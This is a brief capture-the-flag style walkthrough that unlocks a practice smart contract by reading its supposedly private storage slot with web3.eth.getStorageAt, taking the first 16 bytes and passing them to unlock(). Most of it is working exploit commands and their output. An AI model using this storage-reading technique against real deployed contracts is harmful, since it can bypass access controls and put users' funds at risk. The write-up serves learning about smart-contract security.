Idea is to call unlock() with a _key whose value is equivalent to the first 16 bytes of the data stored in the memory address of data[2]. We can access this memory storage with the right indexation into the contract address. Based on how memory storage works in smart contracts (i.e. data is stored in 32-byte slots in an optimized way), we know that data[2] lives at index 3.

instance: 0xe12a914206c964d0c739807007e8de9220fb44fb

>web3.eth.getStorageAt(instance, 3, (err, data) => {
	rs=data;
})
<undefined
>rs
<"0xa91e3fd31d00343595063aa39d4d931846befa2fe62a824eb18c01c13a9ce7dc"

To get the first 16 bytes of this data:
_key=rs.slice(0,34)

Now we can unlock this contract with _key:
await contract.unlock(_key)

To verify result:
await contract.locked()
false

